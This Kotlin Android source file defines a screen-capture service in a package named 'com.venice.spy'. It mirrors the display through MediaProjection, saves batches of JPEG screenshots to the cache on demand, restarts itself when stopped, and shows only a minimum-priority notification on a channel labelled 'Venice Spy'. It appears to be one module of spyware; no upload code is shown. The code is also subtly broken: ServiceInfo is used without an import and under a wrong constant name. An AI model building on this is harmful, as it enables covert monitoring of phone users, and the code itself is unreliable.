package com.venice.spy

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.io.File
import java.io.FileOutputStream

class ScreenCaptureService : Service() {

    companion object {
        @Volatile var instance: ScreenCaptureService? = null
        private const val CH = "vspy"
        private const val NID = 4243

        fun start(ctx: Context, code: Int, data: Intent) {
            val i = Intent(ctx, ScreenCaptureService::class.java)
            i.putExtra("code", code)
            i.putExtra("data", data)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i)
            else ctx.startService(i)
        }

        fun capture(ctx: Context, frames: Int): List<File> {
            val s = instance ?: return emptyList()
            return runBlocking { s.grab(frames) }
        }
    }

    private var projection: MediaProjection? = null
    private var reader: ImageReader? = null
    private var vd: VirtualDisplay? = null
    private val mutex = Mutex()
    private var w = 0
    private var h = 0

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val code = intent?.getIntExtra("code", 0) ?: 0
        @Suppress("DEPRECATION")
        val data: Intent? = intent?.getParcelableExtra("data")

        createChannel()
        val n = NotificationCompat.Builder(this, CH)
            .setContentTitle("Screen capture")
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        try {
            ServiceCompat.startForeground(this, NID, n,
                if (Build.VERSION.SDK_INT >= 29)
                    ServiceInfo.MEDIA_PROJECTION else 0)
        } catch (e: Exception) {
            startForeground(NID, n)
        }

        if (projection == null && data != null) {
            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val p = mgr.getMediaProjection(code, data) ?: return START_STICKY
            projection = p
            p.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() { cleanup() }
            }, null)

            val dm = resources.displayMetrics
            val scale = 720f / dm.widthPixels.toFloat()
            w = 720
            h = (dm.heightPixels * scale).toInt().coerceAtLeast(2)

            reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            vd = p.createVirtualDisplay(
                "vspy", w, h, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader!!.surface, null, null)
        }
        instance = this
        return START_STICKY
    }

    private suspend fun grab(frames: Int): List<File> = mutex.withLock {
        val out = ArrayList<File>()
        val r = reader ?: return@withLock out
        repeat(frames.coerceIn(1, 30)) { idx ->
            var bmp: Bitmap? = null
            var tries = 0
            while (bmp == null && tries < 8) {
                val img: Image? = r.acquireLatestImage()
                if (img != null) {
                    bmp = toBitmap(img, w, h)
                    img.close()
                } else Thread.sleep(250)
                tries++
            }
            if (bmp != null) {
                val f = File(cacheDir, "scr_${System.currentTimeMillis()}_$idx.jpg")
                FileOutputStream(f).use { bmp.compress(Bitmap.CompressFormat.JPEG, 70, it) }
                bmp.recycle()
                out.add(f)
                Thread.sleep(350)
            }
        }
        out
    }

    private fun toBitmap(img: Image, ww: Int, hh: Int): Bitmap? = try {
        val plane = img.planes[0]
        val rowStride = plane.rowStride
        val pixelStride = plane.pixelStride
        val padding = rowStride - pixelStride * ww
        val bmp = Bitmap.createBitmap(ww + padding / pixelStride, hh, Bitmap.Config.ARGB_8888)
        bmp.copyPixelsFromBuffer(plane.buffer)
        if (padding == 0) bmp else Bitmap.createBitmap(bmp, 0, 0, ww, hh)
    } catch (e: Exception) { null }

    private fun cleanup() {
        try { vd?.release() } catch (_: Exception) {}
        try { reader?.close() } catch (_: Exception) {}
        vd = null; reader = null; projection = null
        instance = null
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(CH, "Venice Spy", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
    }

    override fun onDestroy() { cleanup(); super.onDestroy() }
}